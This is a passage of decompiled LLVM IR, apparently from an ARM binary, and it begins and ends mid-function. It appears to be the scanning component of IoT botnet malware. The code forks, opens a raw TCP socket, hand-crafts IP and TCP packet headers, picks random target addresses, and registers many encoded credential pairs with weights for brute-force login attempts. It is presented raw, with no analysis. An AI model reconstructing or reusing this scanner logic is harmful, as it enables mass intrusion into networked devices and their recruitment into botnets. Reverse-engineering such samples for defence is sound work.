  store i32 %v0_fb34, i32* %v3_fb34, align 4
  %v0_fb38 = load i32, i32* %lr.global-to-local, align 4
  %v1_fb38 = load i32, i32* %r8.global-to-local, align 4
  %v2_fb38 = inttoptr i32 %v1_fb38 to i32*
  store i32 %v0_fb38, i32* %v2_fb38, align 4
  %v0_fb3c = load i32, i32* %r1.global-to-local, align 4
  %v1_fb3c = trunc i32 %v0_fb3c to i8
  store i8 %v1_fb3c, i8* @global_var_1a419.189, align 1
  %v0_fb40 = load i32, i32* %r2.global-to-local, align 4
  %v1_fb40 = trunc i32 %v0_fb40 to i8
  store i8 %v1_fb40, i8* bitcast (i8** @global_var_1a418.188 to i8*), align 4
  ret i32 ptrtoint (i8** @global_var_1a418.188 to i32)

; uselistorder directives
  uselistorder i32 %v1_faa4, { 0, 2, 3, 1 }
  uselistorder i32 %v3_fa78, { 1, 0 }
  uselistorder i32 %v2_fa6c, { 1, 0, 2 }
  uselistorder i32 %v1_fa38, { 0, 2, 3, 1 }
  uselistorder i32 %v3_fa0c, { 1, 0 }
  uselistorder i32 %v2_fa00, { 1, 0, 2 }
  uselistorder i32 %v3_f9d0, { 1, 0 }
  uselistorder i32 %v3_f9c8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 (i8*)* @function_11798, { 0, 1, 19, 2, 3, 4, 5, 6, 7, 8, 20, 21, 22, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 23 }
  uselistorder i32* (i32*, i32)* @realloc, { 8, 0, 3, 9, 11, 7, 6, 5, 2, 4, 1, 10, 12 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
}

define i32 @function_fb58(i32 %arg1) local_unnamed_addr {
dec_label_pc_fb58:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %sp.global-to-local = alloca i32, align 4
  store i32 0, i32* %sp.global-to-local, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-41 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-1842 = alloca i32, align 4
  %stack_var_-1862 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_fb58 = load i32, i32* @r4, align 4
  store i32 %v3_fb58, i32* %stack_var_-36, align 4
  %v15_fb58 = load i32, i32* @r8, align 4
  %v18_fb58 = load i32, i32* @sb, align 4
  %v21_fb58 = load i32, i32* @sl, align 4
  %v0_fb64 = call i32 @fork()
  store i32 %v0_fb64, i32* %r0.global-to-local, align 4
  %v2_fb68 = icmp eq i32 %v0_fb64, -1
  %. = zext i1 %v2_fb68 to i32
  %tmp293 = icmp slt i32 %v0_fb64, 1
  %storemerge252 = select i1 %tmp293, i32 %., i32 1
  store i32 %storemerge252, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1a444.191 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb84 = icmp eq i32 %storemerge252, 0
  store i1 %v2_fb84, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_fb64, i32* @global_var_1a444.191, align 4
  br i1 %v2_fb84, label %dec_label_pc_fb9c, label %dec_label_pc_fb90

dec_label_pc_fb90:                                ; preds = %dec_label_pc_fb58
  store i32 %v3_fb58, i32* %r4.global-to-local, align 4
  store i32 %v15_fb58, i32* %r8.global-to-local, align 4
  store i32 %v18_fb58, i32* @sb, align 4
  store i32 %v21_fb58, i32* %sl.global-to-local, align 4
  ret i32 %v0_fb64

dec_label_pc_fb9c:                                ; preds = %dec_label_pc_fb58
  %v0_fb9c = call i32 @function_11a50()
  store i32 %v0_fb9c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a420.104 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_fb9c, i32* @global_var_1a420.104, align 4
  %v1_fba8 = call i32 @function_f6d4(i32 %v0_fb9c)
  %v0_fbac = load i32, i32* @r4, align 4
  store i32 %v0_fbac, i32* %r0.global-to-local, align 4
  %v1_fbb0 = inttoptr i32 %v0_fbac to i32*
  %v2_fbb0 = call i32 @time(i32* %v1_fbb0)
  store i32 ptrtoint (i32* @global_var_1a41c.182 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_fbb0, i32* @global_var_1a41c.182, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_fbc4 = call i32* @calloc(i32 256, i32 288)
  %v4_fbc4 = ptrtoint i32* %v2_fbc4 to i32
  store i32 %v4_fbc4, i32* %lr.global-to-local, align 4
  %v0_fbd0 = load i32, i32* @r4, align 4
  store i32 %v0_fbd0, i32* %stack_var_-52, align 4
  store i32 %v4_fbc4, i32* @global_var_1a43c.195, align 4
  store i32 %v0_fbd0, i32* %r3.global-to-local, align 4
  store i32 %v0_fbd0, i32* @r5, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 %v0_fbd0, i32* %ip.global-to-local, align 4
  %v1_fbe8 = add i32 %v4_fbc4, 4
  store i32 %v1_fbe8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fbec

dec_label_pc_fbec:                                ; preds = %dec_label_pc_fbec.dec_label_pc_fbec_crit_edge, %dec_label_pc_fb9c
  %v0_fc04 = phi i32 [ %v0_fc04.pre, %dec_label_pc_fbec.dec_label_pc_fbec_crit_edge ], [ %v0_fbd0, %dec_label_pc_fb9c ]
  %v0_fbf4 = phi i32 [ %v0_fc0c, %dec_label_pc_fbec.dec_label_pc_fbec_crit_edge ], [ %v0_fbd0, %dec_label_pc_fb9c ]
  %v1_fbfc = phi i32 [ %v1_fbfc.pre, %dec_label_pc_fbec.dec_label_pc_fbec_crit_edge ], [ %v4_fbc4, %dec_label_pc_fb9c ]
  %v3_fbec = mul i32 %v0_fbf4, 256
  store i32 %v3_fbec, i32* %r2.global-to-local, align 4
  %v1_fbf4 = add i32 %v0_fbf4, 1
  store i32 %v1_fbf4, i32* %ip.global-to-local, align 4
  %v2_fbf8 = mul i32 %v0_fbf4, 288
  %v2_fbfc = add i32 %v1_fbfc, 12
  %v2_fc04 = add i32 %v2_fbfc, %v2_fbf8
  %v3_fc04 = inttoptr i32 %v2_fc04 to i32*
  store i32 %v0_fc04, i32* %v3_fc04, align 4
  %v0_fc08 = load i32, i32* %r0.global-to-local, align 4
  %v1_fc08 = load i32, i32* %r1.global-to-local, align 4
  %v2_fc08 = inttoptr i32 %v1_fc08 to i32*
  store i32 %v0_fc08, i32* %v2_fc08, align 4
  %v3_fc08 = load i32, i32* %r1.global-to-local, align 4
  %v4_fc08 = add i32 %v3_fc08, 288
  store i32 %v4_fc08, i32* %r1.global-to-local, align 4
  %v0_fc0c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_fc0c, i32* %r3.global-to-local, align 4
  %v7_fc10 = icmp sgt i32 %v1_fbf4, 255
  br i1 %v7_fc10, label %dec_label_pc_fc14, label %dec_label_pc_fbec.dec_label_pc_fbec_crit_edge

dec_label_pc_fbec.dec_label_pc_fbec_crit_edge:    ; preds = %dec_label_pc_fbec
  %v1_fbfc.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_fc04.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fbec

dec_label_pc_fc14:                                ; preds = %dec_label_pc_fbec
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 %v0_fc0c, i32* %stack_var_-52, align 4
  %v3_fc24 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_fc24, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a440.197 to i32), i32* %lr.global-to-local, align 4
  %v2_fc2c = icmp eq i32 %v3_fc24, -1
  store i1 %v2_fc2c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fc2c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_fc24, i32* %r4.global-to-local, align 4
  store i32 %v3_fc24, i32* @global_var_1a440.197, align 4
  br i1 %v2_fc2c, label %dec_label_pc_103fc, label %dec_label_pc_fc3c

dec_label_pc_fc3c:                                ; preds = %dec_label_pc_fc14
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_fc40 = load i32, i32* @r5, align 4
  store i32 %v0_fc40, i32* %r2.global-to-local, align 4
  %v2_fc44 = call i32 (i32, i32, ...) @fcntl(i32 %v3_fc24, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_fc4c = or i32 %v2_fc44, 2048
  store i32 %v1_fc4c, i32* %r2.global-to-local, align 4
  %v0_fc50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fc50, i32* %r0.global-to-local, align 4
  %v2_fc54 = call i32 (i32, i32, ...) @fcntl(i32 %v0_fc50, i32 4)
  %v2_fc60 = load i32, i32* @global_var_1a440.197, align 4
  store i32 %v2_fc60, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_fc68 = load i32, i32* @r5, align 4
  store i32 %v0_fc68, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_fc70 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_fc70, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r4.global-to-local, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v7_fc80 = call i32 @setsockopt(i32 %v2_fc60, i32 %v0_fc68, i32 3, i32* nonnull %stack_var_-52, i32 4)
  store i32 %v7_fc80, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc84 = icmp eq i32 %v7_fc80, 0
  store i1 %v2_fc84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc84, label %dec_label_pc_fc8c, label %dec_label_pc_104ec

dec_label_pc_fc8c:                                ; preds = %dec_label_pc_fc3c, %dec_label_pc_fc8c
  %v0_fc8c = call i32 @function_f67c()
  %v3_fc90 = mul i32 %v0_fc8c, 65536
  store i32 %v3_fc90, i32* %r0.global-to-local, align 4
  %v1_fc9c = mul i32 %v0_fc8c, 256
  %v3_fca0 = and i32 %v1_fc9c, 65280
  %tmp296 = udiv i32 %v0_fc8c, 256
  %v4_fca4 = urem i32 %tmp296, 256
  %v5_fca4 = or i32 %v4_fca4, %v3_fca0
  store i32 %v5_fca4, i32* %r3.global-to-local, align 4
  %v2_fca8 = icmp ugt i32 %v5_fca4, 1023
  store i1 %v2_fca8, i1* %cpsr_c.global-to-local, align 1
  %v7_fca8 = icmp eq i32 %v5_fca4, 1024
  store i1 %v7_fca8, i1* %cpsr_z.global-to-local, align 1
  %v3_fcac = icmp ult i32 %v5_fca4, 1022
  br i1 %v3_fcac, label %dec_label_pc_fc8c, label %dec_label_pc_fcb0

dec_label_pc_fcb0:                                ; preds = %dec_label_pc_fc8c
  %v5_fc98.le = trunc i32 %v0_fc8c to i8
  store i32 ptrtoint (i32* @global_var_1a3ec.199 to i32), i32* %ip.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i8 69, i8* bitcast (i32* @global_var_1a3ec.199 to i8*), align 4
  store i8 40, i8* bitcast (i32* @global_var_1a3ef.200 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1a3ee.201 to i8*), align 4
  %v0_fce4 = call i32 @function_f67c()
  %v1_fce4 = trunc i32 %v0_fce4 to i8
  store i32 %v0_fce4, i32* %r0.global-to-local, align 4
  %v3_fcec = load i8, i8* @global_var_1a40c.204, align 1
  store i32 ptrtoint (i32* @global_var_1a3ec.199 to i32), i32* %lr.global-to-local, align 4
  %v4_fcf4251 = udiv i32 %v0_fce4, 256
  %v1_fcf8 = trunc i32 %v4_fcf4251 to i8
  store i8 %v1_fcf8, i8* bitcast (i32* @global_var_1a3f1.205 to i8*), align 4
  %v4_fcfc = sext i8 %v5_fc98.le to i32
  store i8 6, i8* bitcast (i32* @global_var_1a3f5.206 to i8*), align 4
  %tmp = urem i8 %v3_fcec, 16
  %v1_fd08 = zext i8 %tmp to i32
  store i32 ptrtoint (i32* @global_var_1a400.203 to i32), i32* %r2.global-to-local, align 4
  %v1_fd10 = and i32 %v4_fcfc, 128
  %v2_fd10 = icmp ne i32 %v1_fd10, 0
  store i1 %v2_fd10, i1* %cpsr_c.global-to-local, align 1
  %v3_fd10 = sdiv i32 %v4_fcfc, 256
  store i32 %v3_fd10, i32* %ip.global-to-local, align 4
  %v1_fd14 = or i32 %v1_fd08, 80
  store i32 %v1_fd14, i32* %r1.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_1a3f4.207 to i8*), align 4
  %v1_fd20 = trunc i32 %v1_fd14 to i8
  store i8 %v1_fd20, i8* @global_var_1a40c.204, align 1
  store i8 23, i8* bitcast (i32* @global_var_1a403.208 to i8*), align 4
  store i32 %v4_fcfc, i32* %r3.global-to-local, align 4
  %v1_fd30 = trunc i32 %v3_fd10 to i8
  store i8 %v1_fd30, i8* bitcast (i32* @global_var_1a401.209 to i8*), align 4
  store i8 %v1_fce4, i8* bitcast (i32* @global_var_1a3f0.210 to i8*), align 4
  store i8 %v5_fc98.le, i8* bitcast (i32* @global_var_1a400.203 to i8*), align 4
  %v0_fd3c = load i32, i32* @r5, align 4
  %v1_fd3c = trunc i32 %v0_fd3c to i8
  store i8 %v1_fd3c, i8* bitcast (i32* @global_var_1a402.211 to i8*), align 4
  %v0_fd40 = call i32 @function_f67c()
  %v1_fd40 = trunc i32 %v0_fd40 to i8
  %v3_fd48 = load i8, i8* @global_var_1a40d.212, align 1
  %v4_fd48 = zext i8 %v3_fd48 to i32
  store i32 ptrtoint (i32* @global_var_1a400.203 to i32), i32* %lr.global-to-local, align 4
  %v2_fd50 = and i32 %v0_fd40, 128
  %v3_fd50 = icmp ne i32 %v2_fd50, 0
  store i1 %v3_fd50, i1* %cpsr_c.global-to-local, align 1
  %v4_fd50 = sdiv i32 %v0_fd40, 256
  store i32 %v4_fd50, i32* %ip.global-to-local, align 4
  %v1_fd54 = or i32 %v4_fd48, 2
  store i32 %v1_fd54, i32* %r3.global-to-local, align 4
  %v1_fd5c = trunc i32 %v4_fd50 to i8
  store i8 %v1_fd5c, i8* bitcast (i32* @global_var_1a40f.213 to i8*), align 4
  %v1_fd60 = trunc i32 %v1_fd54 to i8
  store i8 %v1_fd60, i8* @global_var_1a40d.212, align 1
  store i8 %v1_fd40, i8* bitcast (i32* @global_var_1a40e.214 to i8*), align 4
  store i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_120d0.218 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_fd74 = call i32 @function_f9b4(i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32 ptrtoint (i32* @global_var_120d0.218 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_12048.220 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_fd84 = call i32 @function_f9b4(i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32 ptrtoint ([5 x i8]* @global_var_12048.220 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_12050.222 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_fd94 = call i32 @function_f9b4(i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32 ptrtoint ([9 x i8]* @global_var_12050.222 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_1205c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1205c.224 to i32), i32* %r1.global-to-local, align 4
  %v5_fda4 = call i32 @function_f9b4(i32 ptrtoint ([7 x i8]* @global_var_1205c.224 to i32), i32 ptrtoint ([7 x i8]* @global_var_1205c.224 to i32), i32 12)
  store i32 ptrtoint ([8 x i8]* @global_var_12064.226 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_120d0.218 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_fdb4 = call i32 @function_f9b4(i32 ptrtoint ([8 x i8]* @global_var_12064.226 to i32), i32 ptrtoint (i32* @global_var_120d0.218 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1206c.228 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_fdc4 = call i32 @function_f9b4(i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32 ptrtoint ([9 x i8]* @global_var_1206c.228 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_12078.230 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_12078.230 to i32), i32* %r1.global-to-local, align 4
  %v5_fdd4 = call i32 @function_f9b4(i32 ptrtoint ([6 x i8]* @global_var_12078.230 to i32), i32 ptrtoint ([6 x i8]* @global_var_12078.230 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_12080.232 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_fde4 = call i32 @function_f9b4(i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32 ptrtoint ([6 x i8]* @global_var_12080.232 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_12088.234 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_12088.234 to i32), i32* %r1.global-to-local, align 4
  %v5_fdf4 = call i32 @function_f9b4(i32 ptrtoint ([8 x i8]* @global_var_12088.234 to i32), i32 ptrtoint ([8 x i8]* @global_var_12088.234 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_12064.226 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_fe04 = call i32 @function_f9b4(i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32 ptrtoint ([8 x i8]* @global_var_12064.226 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_12090.236 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_fe14 = call i32 @function_f9b4(i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32 ptrtoint (i32* @global_var_12090.236 to i32), i32 17)
  store i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_120a0.238 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_fe24 = call i32 @function_f9b4(i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), i32 ptrtoint ([6 x i8]* @global_var_120a0.238 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_120a8.240 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_120a8.240 to i32), i32* %r1.global-to-local, align 4
  %v5_fe34 = call i32 @function_f9b4(i32 ptrtoint ([5 x i8]* @global_var_120a8.240 to i32), i32 ptrtoint ([5 x i8]* @global_var_120a8.240 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_120a8.240 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_120a0.238 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_fe44 = call i32 @function_f9b4(i32 ptrtoint ([5 x i8]* @global_var_120a8.240 to i32), i32 ptrtoint ([6 x i8]* @global_var_120a0.238 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_12064.226 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_120b0.242 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_fe54 = call i32 @function_f9b4(i32 ptrtoint ([8 x i8]* @global_var_12064.226 to i32), i32 ptrtoint (i32* @global_var_120b0.242 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_12064.226 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_120bc.244 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_fe64 = call i32 @function_f9b4(i32 ptrtoint ([8 x i8]* @global_var_12064.226 to i32), i32 ptrtoint (i32* @global_var_120bc.244 to i32), i32 15)
  %v2_fe6c = ptrtoint i32* %stack_var_-1862 to i32
  store i32 %v2_fe6c, i32* %r0.global-to-local, align 4
  %v2_fe70 = ptrtoint i32* %stack_var_-1842 to i32
  store i32 %v2_fe70, i32* %r1.global-to-local, align 4
  %tmp297 = bitcast i32* %stack_var_-1842 to i8*
  %v1_10210 = add i32 %v2_fe6c, 16
  %v2_10210 = inttoptr i32 %v1_10210 to i32*
  %v1_10234 = or i32 %v2_fe70, 1
  %v2_10234 = inttoptr i32 %v1_10234 to i8*
  %v1_10258 = or i32 %v2_fe70, 2
  %v2_10258 = inttoptr i32 %v1_10258 to i8*
  %v1_1025c = or i32 %v2_fe70, 3
  %v2_1025c = inttoptr i32 %v1_1025c to i8*
  %v1_10274 = add i32 %v2_fe70, 13
  %v2_10274 = inttoptr i32 %v1_10274 to i8*
  %v1_10220 = add i32 %v2_fe6c, 9
  %v2_10220 = inttoptr i32 %v1_10220 to i8*
  %v1_10298 = add i32 %v2_fe70, 8
  %v2_10298 = inttoptr i32 %v1_10298 to i32*
  %v1_102d8 = add i32 %v2_fe6c, 12
  %v2_102d8 = inttoptr i32 %v1_102d8 to i32*
  %v2_1050c = ptrtoint i32* %stack_var_-36 to i32
  %v2_10590 = ptrtoint i32* %stack_var_-76 to i32
  %v2_10594 = ptrtoint i32* %stack_var_-348 to i32
  %tmp340 = bitcast i32* %stack_var_-348 to %_TYPEDEF_fd_set*
  %v2_1059c = ptrtoint i32* %stack_var_-64 to i32
  %v2_105a0 = ptrtoint i32* %stack_var_-220 to i32
  %tmp341 = bitcast i32* %stack_var_-220 to %_TYPEDEF_fd_set*
  %tmp343 = bitcast i32* %stack_var_-64 to %timeval*
  %v2_10f4c = ptrtoint i32* %stack_var_-41 to i32
  %v2_10f5c = ptrtoint i32* %stack_var_-73 to i32
  %v2_10738 = ptrtoint i32* %stack_var_-56 to i32
  %v2_10c30 = ptrtoint i32* %stack_var_-48 to i32
  %v2_10184 = ptrtoint i32* %stack_var_-92 to i32
  %tmp298 = bitcast i32* %stack_var_-92 to %sockaddr*
  br label %dec_label_pc_fe7c

dec_label_pc_fe7c:                                ; preds = %dec_label_pc_105fc, %dec_label_pc_fcb0
  store i32 ptrtoint (i32* @global_var_1a41c.182 to i32), i32* %r2.global-to-local, align 4
  %v2_fe80 = load i32, i32* @global_var_1a41c.182, align 4
  store i32 %v2_fe80, i32* %r8.global-to-local, align 4
  %v0_fe84 = load i32, i32* @fp, align 4
  %v3_fe84 = icmp uge i32 %v0_fe84, %v2_fe80
  store i1 %v3_fe84, i1* %cpsr_c.global-to-local, align 1
  %v9_fe84 = icmp eq i32 %v0_fe84, %v2_fe80
  store i1 %v9_fe84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fe84, label %dec_label_pc_101b0, label %dec_label_pc_fe8c

dec_label_pc_fe8c:                                ; preds = %dec_label_pc_fe7c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_fe98

dec_label_pc_fe98:                                ; preds = %.thread68.dec_label_pc_fe98_crit_edge, %dec_label_pc_fe8c
  %v0_fe98 = phi i32 [ %v0_fe98.pre, %.thread68.dec_label_pc_fe98_crit_edge ], [ 0, %dec_label_pc_fe8c ]
  store i32 %v0_fe98, i32* %stack_var_-92, align 4
  %v0_fea8 = call i32 @function_f67c()
  %v1_fea8 = trunc i32 %v0_fea8 to i8
  store i32 %v0_fea8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a420.104 to i32), i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a3ec.199 to i32), i32* %lr.global-to-local, align 4
  %v2_feb4 = load i32, i32* @global_var_1a420.104, align 4
  store i32 %v2_feb4, i32* %r2.global-to-local, align 4
  %v2_feb8 = and i32 %v0_fea8, 128
  %v3_feb8 = icmp ne i32 %v2_feb8, 0
  store i1 %v3_feb8, i1* %cpsr_c.global-to-local, align 1
  %v4_feb8 = sdiv i32 %v0_fea8, 256
  store i32 %v4_feb8, i32* %r3.global-to-local, align 4
  %v1_febc = trunc i32 %v4_feb8 to i8
  store i8 %v1_febc, i8* bitcast (i32* @global_var_1a3f1.205 to i8*), align 4
  store i32 %v2_feb4, i32* @global_var_1a3f8.245, align 4
  store i8 %v1_fea8, i8* bitcast (i32* @global_var_1a3f0.210 to i8*), align 4
  br label %dec_label_pc_fec8

dec_label_pc_fec8:                                ; preds = %dec_label_pc_10020, %dec_label_pc_fef8, %dec_label_pc_10054, %dec_label_pc_10048, %dec_label_pc_1003c, %dec_label_pc_10030, %.thread53, %.thread37, %.thread33, %.thread29, %bb324, %bb323, %bb322, %bb321, %bb320, %bb319, %bb318, %bb317, %bb316, %bb315, %dec_label_pc_ff94, %dec_label_pc_ff8c, %bb309, %dec_label_pc_ff5c, %dec_label_pc_ff38, %bb302, %dec_label_pc_ff08, %bb301, %dec_label_pc_fef0, %bb300, %bb326, %dec_label_pc_fe98
  %v0_fec8 = call i32 @function_f67c()
  store i32 %v0_fec8, i32* %r0.global-to-local, align 4
  %v1_fecc = urem i32 %v0_fec8, 256
  store i32 %v1_fecc, i32* %r1.global-to-local, align 4
  %v3_fed0 = udiv i32 %v0_fec8, 256
  store i32 %v3_fed0, i32* %r3.global-to-local, align 4
  %v3_fed4 = udiv i32 %v0_fec8, 65536
  store i32 %v3_fed4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fed8 = icmp eq i32 %v1_fecc, 0
  store i1 %v2_fed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fed8, label %bb300, label %bb299

bb299:                                            ; preds = %dec_label_pc_fec8
  %v3_fedc = icmp ugt i32 %v1_fecc, 126
  store i1 %v3_fedc, i1* %cpsr_c.global-to-local, align 1
  %v8_fedc = icmp eq i32 %v1_fecc, 127
  store i1 %v8_fedc, i1* %cpsr_z.global-to-local, align 1
  br label %bb300

bb300:                                            ; preds = %dec_label_pc_fec8, %bb299
  %v0_feec = phi i1 [ true, %dec_label_pc_fec8 ], [ %v8_fedc, %bb299 ]
  %v1_fee0 = urem i32 %v3_fed0, 256
  store i32 %v1_fee0, i32* %ip.global-to-local, align 4
  %v1_fee4 = urem i32 %v3_fed4, 256
  store i32 %v1_fee4, i32* %r2.global-to-local, align 4
  %v1_fee8 = and i32 %v0_fec8, 8388608
  %v2_fee8 = icmp ne i32 %v1_fee8, 0
  store i1 %v2_fee8, i1* %cpsr_c.global-to-local, align 1
  %v3_fee8 = udiv i32 %v0_fec8, 16777216
  store i32 %v3_fee8, i32* %r0.global-to-local, align 4
  br i1 %v0_feec, label %dec_label_pc_fec8, label %dec_label_pc_fef0

dec_label_pc_fef0:                                ; preds = %bb300
  %v2_fef0 = icmp ugt i32 %v1_fecc, 2
  store i1 %v2_fef0, i1* %cpsr_c.global-to-local, align 1
  %v7_fef0 = icmp eq i32 %v1_fecc, 3
  store i1 %v7_fef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fef0, label %dec_label_pc_fec8, label %dec_label_pc_fef8

